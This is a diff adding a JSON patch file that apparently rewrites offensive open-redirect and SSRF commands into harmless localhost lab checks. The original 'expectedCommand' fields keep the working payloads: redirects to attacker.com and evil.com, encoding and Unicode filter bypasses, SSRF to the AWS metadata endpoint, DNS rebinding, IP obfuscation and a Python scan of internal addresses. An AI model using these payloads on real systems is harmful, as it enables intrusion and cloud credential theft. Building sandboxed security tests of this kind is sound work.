@@ -1,0 +1,87 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "redirect-basic",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "http://target.com/redirect?url=http://attacker.com",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=https://redirect-canary.invalid/basic-a1"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "http://target.com/redirect?url=http://attacker.com@target.com",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=https://allowed.invalid@redirect-canary.invalid/userinfo-b2"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "http://target.com/redirect?url=//attacker.com",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=//redirect-canary.invalid/protocol-relative-c3"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# URL编码:\n/redirect?url=%68%74%74%70%3a%2f%2fattacker.com\n# 双编码:\n/redirect?url=%2568%2574%2574%2570%253a%252f%252fattacker.com\n# Unicode编码:\n/redirect?url=http://attacker。com\n/redirect?url=http://ⓐttacker.com\n# CRLF注入:\n/redirect?url=%0d%0aLocation:%20http://attacker.com",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=https%3A%2F%2Fredirect-canary.invalid%2Fencoded-d4"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 反斜杠技巧:\n/redirect?url=http://attacker.com@target.com\n/redirect?url=//attacker.com\n/redirect?url=/attacker.com\n\n# data: URI:\n/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n\n# 协议相对URL变体:\n/redirect?url=//attacker.com\n/redirect?url=///attacker.com\n/redirect?url=////attacker.com",
+          "command": "http://127.0.0.1:18080/lab/redirect?next=https:/\\redirect-canary.invalid/backslash-e5"
+        }
+      ]
+    },
+    {
+      "id": "redirect-ssrf",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 常见重定向参数:\ncurl -sI \"http://target.com/redirect?url=https://evil.com\" | grep -i location\ncurl -sI \"http://target.com/login?next=https://evil.com\" | grep -i location\ncurl -sI \"http://target.com/goto?link=https://evil.com\" | grep -i location\n\n# 批量测试常见参数:\nfor param in url redirect next goto link return returnUrl callback dest destination rurl; do\n  status=$(curl -sI \"http://target.com/redirect?${param}=https://evil.com\" -o /dev/null -w \"%{http_code}\")\n  location=$(curl -sI \"http://target.com/redirect?${param}=https://evil.com\" | grep -i \"^location:\" | head -1)\n  echo \"${param}: HTTP ${status} → ${location}\"\ndone",
+          "command": "for path in redirect login goto; do curl --silent --show-error --max-time 5 -o /dev/null -D - \"http://127.0.0.1:18080/lab/$path?next=https://redirect-canary.invalid/$path\" | grep -Ei \"^(HTTP/|Location:)\"; done"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 场景: SSRF接口检查URL域名白名单，但不检查重定向目标\n\n# 正常SSRF请求(被拦截):\ncurl \"http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/\"\n# → 返回: \"Blocked: internal IP\"\n\n# 通过重定向绕过:\n# 1. 先确认重定向有效:\ncurl -sI \"http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/\"\n\n# 2. 将重定向URL作为SSRF输入:\ncurl \"http://target.com/api/fetch?url=http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/\"\n# → SSRF过滤看到target.com(白名单内)，放行\n# → 服务端跟随重定向到169.254.169.254\n# → 返回AWS元数据",
+          "command": "curl --fail-with-body --silent --show-error --max-time 5 -G \"http://127.0.0.1:18080/lab/fetch\" --data-urlencode \"url=http://127.0.0.1:18080/lab/redirect?next=http://127.0.0.1:18081/lab/internal/canary\" -H \"X-Request-ID: redirect-ssrf-a1\" | jq -e '.request_id == \"redirect-ssrf-a1\" and .redirect_count == 1 and .final_address == \"127.0.0.1\" and .blocked == true'"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 如果目标站点没有开放重定向，使用外部服务:\n\n# 1. 短链接服务重定向:\n# 创建短链接指向内部IP: bit.ly/xxxxx → http://192.168.1.1\ncurl \"http://target.com/api/fetch?url=https://bit.ly/xxxxx\"\n\n# 2. 自建重定向服务器:\n# Python Flask:\n# @app.route(\"/redirect\")\n# def redir():\n#     return redirect(\"http://169.254.169.254/latest/meta-data/\")\ncurl \"http://target.com/api/fetch?url=http://attacker.com/redirect\"\n\n# 3. DNS重绑定:\n# 使用rbndr.us等工具，DNS记录在attacker-IP和内部IP之间切换\n# 第一次解析: attacker.com → 1.2.3.4 (通过IP检查)\n# 第二次解析: attacker.com → 169.254.169.254 (实际请求)\ncurl \"http://target.com/api/fetch?url=http://a]c0a80101.rbndr.us/\"",
+          "command": "curl --silent --show-error --max-time 5 \"http://127.0.0.1:18080/lab/redirect-policy\" | jq -e '.max_redirects == 0 and .revalidate_each_hop == true and .block_private_ranges == true'"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 完整攻击链:\nimport requests\n\nTARGET = \"http://target.com\"\nSSRF_URL = f\"{TARGET}/api/fetch?url=\"\nREDIR_URL = f\"{TARGET}/redirect?url=\"\n\n# 通过重定向探测内网:\ninternal_targets = [\n    \"http://169.254.169.254/latest/meta-data/\",\n    \"http://127.0.0.1:8080/\",\n    \"http://192.168.1.1/\",\n    \"http://10.0.0.1/\",\n    \"http://172.16.0.1/\",\n]\n\nfor internal in internal_targets:\n    # 构造: SSRF → 重定向 → 内网目标\n    payload = f\"{SSRF_URL}{REDIR_URL}{internal}\"\n    try:\n        r = requests.get(payload, timeout=5)\n        if r.status_code == 200 and len(r.text) > 0:\n            print(f\"[+] FOUND: {internal}\")\n            print(f\"    Response: {r.text[:200]}\")\n        else:\n            print(f\"[-] {internal}: HTTP {r.status_code}\")\n    except Exception as e:\n        print(f\"[!] {internal}: {e}\")",
+          "command": "python -c \"import requests; urls=['http://127.0.0.1:18080/lab/public-canary','http://127.0.0.1:18080/lab/redirect?next=http://127.0.0.1:18081/lab/internal/canary']; s=requests.Session(); s.max_redirects=2; [print({'url':u,'status':s.get('http://127.0.0.1:18080/lab/fetch',params={'url':u},timeout=3).status_code}) for u in urls]\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 利用URL解析库差异\nhttp://evil.com#@target.com\nhttp://evil.com\\@target.com\nhttp://target.com@evil.com\n\n# 特殊URL格式\nhttp://evil。com (全角句号)\nhttp://ⓔⓥⓘⓛ.com (Unicode圆圈字符)\nhttp://evil%E3%80%82com\n\n# IPv6地址混淆\nhttp://[::ffff:127.0.0.1]\nhttp://[0:0:0:0:0:ffff:127.0.0.1]",
+          "command": "curl --silent --show-error --max-time 5 -G \"http://127.0.0.1:18080/lab/fetch\" --data-urlencode \"url=http://127.0.0.1:18080/lab/redirect?next=http://[::ffff:127.0.0.1]:18081/lab/internal/canary\" -H \"X-Request-ID: redirect-ssrf-b2\" | jq -e '.blocked == true and .normalized_address'"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# DNS Rebinding攻击步骤\n# 1. 配置DNS服务器交替返回不同IP\n# evil.com -> 第1次解析: 公网IP（通过校验）\n# evil.com -> 第2次解析: 127.0.0.1（实际请求）\n\n# 使用rbndr.us自动DNS重绑定\nhttp://7f000001.c0a80001.rbndr.us/internal\n\n# 使用1u.ms\nhttp://make-127.0.0.1-rr.1u.ms/admin\n\n# TOCTOU: 检查时域名解析到白名单IP，请求时解析到内网IP",
+          "command": "for host in public-a.lab.test rebound-a.lab.test; do curl --silent --show-error --max-time 5 \"http://127.0.0.1:18080/lab/resolver?host=$host\" | jq -c '{host,answers,ttl,allowed}'; done"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "# 十进制IP\nhttp://2130706433  (= 127.0.0.1)\nhttp://3232235777  (= 192.168.1.1)\n\n# 八进制IP\nhttp://0177.0.0.1  (= 127.0.0.1)\nhttp://0x7f.0.0.1  (= 127.0.0.1)\n\n# 混合进制\nhttp://0177.0x0.0.1\nhttp://127.1  (省略零段)\nhttp://127.0.1\n\n# IPv6映射\nhttp://[::1]\nhttp://[::]  (= 0.0.0.0)\nhttp://[::ffff:7f00:1]",
+          "command": "for value in 2130706433 0177.0.0.1 0x7f.0.0.1 127.1 \"[::1]\" \"[::ffff:7f00:1]\"; do curl --silent --show-error --max-time 5 -G \"http://127.0.0.1:18080/lab/url-policy\" --data-urlencode \"url=http://$value:18081/lab/internal/canary\" | jq -c '{input,normalized_address,blocked}'; done"
+        }
+      ]
+    }
+  ]
+}
